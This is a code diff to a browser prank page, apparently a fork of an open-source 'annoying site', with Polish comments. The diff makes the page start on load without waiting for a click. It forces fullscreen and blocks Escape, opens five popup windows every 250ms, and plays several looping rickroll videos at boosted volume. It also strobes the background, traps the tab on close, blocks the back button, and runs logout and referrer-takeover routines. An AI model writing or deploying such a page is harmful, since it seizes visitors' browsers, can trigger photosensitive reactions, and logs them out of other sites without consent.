@@ -157,42 +157,52 @@ const LOGOUT_SITES = {
  * Array to store the child windows spawned by this window.
  */
 const wins = []
-
-/**
- * Count of number of clicks  - added by @9fm
- */
-
 let interactionCount = 0
-
-//Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
-
-const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm
-
-/**
- * Number of iframes injected into the page for the "super logout" functionality.
- * See superLogout().
- */
+const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500)
 let numSuperLogoutIframes = 0
 
-/**
- * Is this window a child window? A window is a child window if there exists a
- * parent window (i.e. the window was opened by another window so `window.opener`
- * is set) *AND* that parent is a window on the same origin (i.e. the window was
- * opened by us, not an external website)
- */
-const isChildWindow = (window.opener && isParentSameOrigin()) ||
-  window.location.search.indexOf('child=true') !== -1
-
-/**
- * Is this window a parent window?
- */
+const isChildWindow = (window.opener && isParentSameOrigin()) || window.location.search.indexOf('child=true') !== -1
 const isParentWindow = !isChildWindow
 
-/*
- * Run this code in all windows, *both* child and parent windows.
- */
-
 init()
+
+if (isChildWindow) initChildWindow()
+else initParentWindow()
+
+function forcePersistentFullscreen () {
+  const req = document.body.requestFullscreen || document.body.webkitRequestFullscreen || document.body.mozRequestFullScreen || document.body.msRequestFullscreen
+  if (req) req.call(document.body).catch(() => {})
+}
+
+function forceRainbowBackground () {
+  setInterval(() => {
+    document.body.style.backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16)
+  }, 80)
+}
+
+function playMultipleRickrolls () {
+  const rickrollSrc = 'media/videos/rickroll.mp4'
+  // 5x głośny rickroll w tle
+  for (let i = 0; i < 5; i++) {
+    const video = document.createElement('video')
+    video.src = rickrollSrc
+    video.loop = true
+    video.muted = false
+    video.volume = 1
+    video.style = HIDDEN_STYLE
+    video.autoplay = true
+    video.play().catch(() => {})
+    document.body.appendChild(video)
+  }
+  // dodatkowy AudioContext boost (jeszcze głośniej)
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)()
+    const gain = ctx.createGain()
+    gain.gain.value = 3 // maksymalny boost
+    const source = ctx.createMediaElementSource(document.querySelector('video'))
+    source.connect(gain).connect(ctx.destination)
+  } catch(e) {}
+}
 
 /*
  * Use `window.opener` to detect if this window was opened by another window, which
@@ -202,35 +212,57 @@ init()
 if (isChildWindow) initChildWindow()
 else initParentWindow()
 
-/**
- * Initialization code for *both* parent and child windows.
- */
 function init () {
   confirmPageUnload()
 
+  // === OD RAZU BEZ CZEKANIA ===
+  forcePersistentFullscreen()
+  rainbowThemeColor()
+  animateUrlWithEmojis()
+  forceRainbowBackground()
+  startTheramin()
+  requestFullscreen()
+  playMultipleRickrolls()           // RICKROLL NON-STOP + GŁOŚNO
+
+  // WIECEJ POP-UPÓW - co 250ms otwiera 3-5 okien
+  setInterval(() => {
+    for (let i = 0; i < 5; i++) openWindow()
+  }, 250)
+
+  // blokada Esc + fullscreen
+  const fsEvents = ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange']
+  fsEvents.forEach(ev => document.addEventListener(ev, () => {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
+      setTimeout(forcePersistentFullscreen, 30)
+    }
+  }))
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape' || e.keyCode === 27) {
+      e.preventDefault()
+      e.stopImmediatePropagation()
+      forcePersistentFullscreen()
+      return false
+    }
+  })
+
   interceptUserInput(event => {
     interactionCount += 1
-
-    // Prevent default behavior (breaks closing window shortcuts)
     event.preventDefault()
     event.stopPropagation()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
-    if (event.which !== 0) openWindow()
+    if (event.which !== 0) {
+      for (let i = 0; i < 3; i++) openWindow() // jeszcze więcej przy kliknięciu
+    }
 
     startVibrateInterval()
     enablePictureInPicture()
     triggerFileDownload()
-
     focusWindows()
     copySpamToClipboard()
     speak()
     startTheramin()
 
-    // Capture key presses on the Command or Control keys, to interfere with the
-    // "Close Window" shortcut.
     if (event.key === 'Meta' || event.key === 'Control') {
       window.print()
       requestWebauthnAttestation()
@@ -240,12 +272,7 @@ function init () {
       requestWebauthnAttestation()
     } else {
       requestPointerLock()
-
-      if (!window.ApplePaySession) {
-        // Don't request TouchID on every interaction in Safari since it blocks
-        // the event loop and stops windows from moving
-        requestWebauthnAttestation()
-      }
+      if (!window.ApplePaySession) requestWebauthnAttestation()
       requestClipboardRead()
       requestMidiAccess()
       requestBluetoothAccess()
@@ -258,51 +285,64 @@ function init () {
   })
 }
 
-/**
- * Initialization code for child windows.
- */
 function initChildWindow () {
   registerProtocolHandlers()
   hideCursor()
   moveWindowBounce()
-  startVideo()
+  startVideo() // rickroll
   detectWindowClose()
   triggerFileDownload()
   speak()
   rainbowThemeColor()
   animateUrlWithEmojis()
-
-  interceptUserInput(event => {
-    if (interactionCount === 1) {
-      startAlertInterval()
-    }
-  })
+  startAlertInterval()
+  forcePersistentFullscreen()
+  playMultipleRickrolls() // rickroll też w childach
 }
 
-/**
- * Initialization code for parent windows.
- */
 function initParentWindow () {
   showHelloMessage()
   blockBackButton()
   fillHistory()
   startInvisiblePictureInPictureVideo()
 
-  interceptUserInput(event => {
-    // Only run these on the first interaction
-    if (interactionCount === 1) {
-      registerProtocolHandlers()
-      attemptToTakeoverReferrerWindow()
-      hideCursor()
-      startVideo()
-      startAlertInterval()
-      superLogout()
-      removeHelloMessage()
-      rainbowThemeColor()
-      animateUrlWithEmojis()
-      speak('To był błąd')
-    }
-  })
+  registerProtocolHandlers()
+  attemptToTakeoverReferrerWindow()
+  hideCursor()
+  startVideo()
+  startAlertInterval()
+  superLogout()
+  removeHelloMessage()
+  rainbowThemeColor()
+  animateUrlWithEmojis()
+  speak('To był błąd')
+  forcePersistentFullscreen()
+  playMultipleRickrolls()
+}
+
+/* ====================== RICKROLL NON-STOP ====================== */
+
+function startInvisiblePictureInPictureVideo () {
+  const video = document.createElement('video')
+  video.src = 'media/videos/rickroll.mp4'
+  video.loop = true
+  video.muted = false
+  video.volume = 1
+  video.style = HIDDEN_STYLE
+  video.autoplay = true
+  video.play()
+  document.body.appendChild(video)
+}
+
+function startVideo () {
+  const video = document.createElement('video')
+  video.src = 'media/videos/rickroll.mp4'
+  video.autoplay = true
+  video.loop = true
+  video.volume = 1
+  video.muted = false
+  video.style = 'width: 100%; height: 100%;'
+  document.body.appendChild(video)
 }
 
 /**
@@ -339,9 +379,29 @@ function isParentSameOrigin () {
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
-    speak('Please don\'t go!')
-    event.returnValue = true
+    speak('Nie zamykaj ptoszka bamboszu!!! Rickroll na zawsze!')
+    forcePersistentFullscreen()
+    event.returnValue = 'NIE ZAMYKAJ – RICKROLL NON-STOP!'
+    return 'NIE ZAMYKAJ – RICKROLL NON-STOP!'
   })
+}
+
+function requestFullscreen () {
+  const req = Element.prototype.requestFullscreen || Element.prototype.webkitRequestFullscreen || Element.prototype.mozRequestFullScreen || Element.prototype.msRequestFullscreen
+  req.call(document.body).catch(() => {})
+}
+
+function repeatStringNumTimes(string, times) {
+  var repeatedString = "";
+  while (times > 0) {
+    repeatedString += string;
+    times--;
+  }
+  return repeatedString;
+}
+
+function getRandomArrayEntry (arr) {
+  return arr[Math.floor(Math.random() * arr.length)]
 }
 
 /**
